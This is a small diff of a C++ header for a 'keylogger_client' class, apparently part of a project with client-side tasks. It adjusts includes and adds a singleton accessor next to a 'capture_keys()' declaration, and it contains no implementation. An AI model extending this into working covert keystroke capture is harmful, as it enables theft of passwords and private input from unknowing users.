@@ -1,7 +1,6 @@
 #pragma once
-#include <cstdint>
+#include <iostream>
 #include <Windows.h>
-#include <task\client_tasks\keylogger\keyhook.h>
 
 class keylogger_client
 {
@@ -13,5 +12,7 @@ class keylogger_client
 public:
 	keylogger_client();
 	bool capture_keys();
+
+	static keylogger_client* get();
 };
 
